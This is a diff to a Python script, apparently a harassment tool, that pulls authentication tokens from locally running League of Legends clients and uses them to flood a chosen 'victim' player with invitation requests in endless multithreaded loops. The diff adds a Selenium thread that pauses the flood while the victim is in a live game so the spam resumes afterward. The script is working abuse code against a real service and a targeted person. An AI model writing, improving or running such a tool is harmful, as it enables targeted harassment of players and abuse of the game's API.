@@ -14,11 +14,6 @@ import psutil
 import threading
 import base64
 
-g_auths = {}
-g_regions = {}
-
-lcu_name = None
-
 # suppress warnings
 #requests.packages.urllib3.disable_warnings() 
 disable_warnings()
@@ -29,7 +24,18 @@ whitelist = [
     'x',
 ]
 
+# global variables
+g_auths = {}
+g_regions = {}
+
+lcu_name = None # LeagueClientUx executable name
+inGame = True # whether the victim is in a game
+
+# functions
 def getLCUName():
+    '''
+    Get LeagueClient executable name depending on platform.
+    '''
     global lcu_name
     if platform.system() == 'Windows':
         lcu_name = 'LeagueClientUx.exe'
@@ -39,9 +45,15 @@ def getLCUName():
         lcu_name = 'LeagueClientUx'
 
 def LCUAvailable():
+    '''
+    Check whether a client is available.
+    '''
     return lcu_name in (p.name() for p in psutil.process_iter())
 
 def getLCUArguments():
+    '''
+    Get region, remoting-auth-token and app-port for LeagueClientUx.
+    '''
     if not LCUAvailable():
         sys.exit('No ' + lcu_name + ' found. Login to an account and try again.')
 
@@ -63,13 +75,43 @@ def getLCUArguments():
             g_auths[app_port] = remoting_auth_token
             g_regions[app_port] = region
 
-def spam(url, data, headers):
-    # start flooding invitations
+def checkLiveGame(driver):
+    '''
+    If victim is in Live Game, wait for it to finish.
+    The victim can join custom games while being flooded,
+    so this function will handle when a player enters a custom game.
+    '''
+    global inGame
+
     while True:
-        r = requests.post(url, data=data.encode('utf-8'), headers=headers, verify=False)
-        print('[' + datetime.now().strftime('%H:%M:%S') + '] Flooding...')
-        print('[Response] ' + r.text)
-        #sleep(0.01)
+        try:
+            driver.find_element_by_xpath('//span[contains(text(), "Live Game")]').click()
+            sleep(3)
+
+            try:
+                spectator = driver.find_element_by_xpath('//div[@class="SpectatorError"]')
+                inGame = False
+                break
+            except:
+                inGame = True
+                print('[' + datetime.now().strftime('%H:%M:%S') + '] Player is in live game. Refreshing in 5 seconds...')
+                sleep(2)
+        except:
+            driver.quit()
+            sys.exit('Could not find the Live Game button.')
+
+def spam(url, data, headers):
+    '''
+    Spam invite requests function.
+    '''
+    while True:
+        if not inGame:
+            r = requests.post(url, data=data.encode('utf-8'), headers=headers, verify=False)
+            print('[' + datetime.now().strftime('%H:%M:%S') + '] Flooding...')
+            print('[Response] ' + r.text)
+            #sleep(0.01)
+        else:
+            sleep(2)
 
 def main():
     # get LeagueClient name
@@ -149,23 +191,12 @@ def main():
     summoner_name = driver.find_element_by_xpath('//span[@class="Name"]').text
     summoner_name = summoner_name.encode('utf-8').decode('utf-8')
 
-    # if he's in Live Game, wait for it to finish
-    while True:
-        try:
-            driver.find_element_by_xpath('//span[contains(text(), "Live Game")]').click()
-            sleep(3)
+    # if victim is in Live Game, wait for it to finish
+    thrLiveGame = threading.Thread(target=checkLiveGame, args=(driver,))
+    thrLiveGame.daemon = True
+    thrLiveGame.start()
 
-            try:
-                spectator = driver.find_element_by_xpath('//div[@class="SpectatorError"]')
-                break
-            except:
-                print('[' + datetime.now().strftime('%H:%M:%S') + '] Player is in live game. Refreshing in 5 seconds...')
-                sleep(2)
-        except:
-            driver.quit()
-            sys.exit('somethng broke')
-
-    driver.quit()
+    #driver.quit()
 
     print('Summoner Name: ' + summoner_name)
     print('Summoner ID: ' + summoner_id)
@@ -210,13 +241,14 @@ def main():
             thr.daemon = True # make thread daemon so it kills when we exit script
             thr.start()
     
-    print('Loaded all non-whitelisted accounts. If you keep seeing this message, it means that you have 0 non-whitelisted accounts.')
+    print('Loaded all non-whitelisted accounts.')
 
     # keep main thread alive
     try:
         while True:
             sleep(1)
     except KeyboardInterrupt:
+        driver.quit()
         sys.exit()
 
 if __name__ == '__main__':
